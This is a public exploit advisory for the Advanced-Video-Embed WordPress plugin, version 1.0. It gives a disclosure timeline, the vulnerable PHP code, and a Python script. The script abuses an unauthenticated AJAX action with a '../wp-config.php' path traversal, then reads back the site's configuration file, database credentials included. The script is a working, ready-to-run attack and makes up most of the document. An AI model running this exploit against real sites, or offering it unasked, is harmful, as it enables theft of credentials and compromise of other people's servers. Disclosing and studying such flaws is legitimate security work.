 
# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Version: 1.0
 
#   Timeline
#   03/24/2016 - Bug discovered
#   03/24/2016 - Initial notification of vendor
#   04/01/2016 - No answer from vendor, public release of bug 
 
 
# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:
 
#  function ave_publishPost(){
#    $title = $_REQUEST[&#039;title&#039;];
#    $term = $_REQUEST[&#039;term&#039;];
#    $thumb = $_REQUEST[&#039;thumb&#039;];
# <snip>
# Line 78:
#    $image_data = file_get_contents($thumb);
 
 
 
 
import random
import urllib2
import re
 
 
randomID = long(random.random() * 100000000000000000L)
 
objHtml = urllib2.urlopen(url + &#039;/wp-admin/admin-ajax.php?action=ave_publishPost&title=&#039; + str(randomID) + &#039;&short=rnd&term=rnd&thumb=../wp-config.php&#039;)
content =  objHtml.readlines()
for line in content:
    numbers = re.findall(r&#039;\d+&#039;,line)
    id = numbers[-1]
    id = int(id) / 10
 
objHtml = urllib2.urlopen(url + &#039;/?p=&#039; + str(id))
content = objHtml.readlines()
 
for line in content:
    if &#039;attachment-post-thumbnail size-post-thumbnail wp-post-image&#039; in line:
        urls=re.findall(&#039;"(https?://.*?)"&#039;, line)
        print urllib2.urlopen(urls[0]).read()

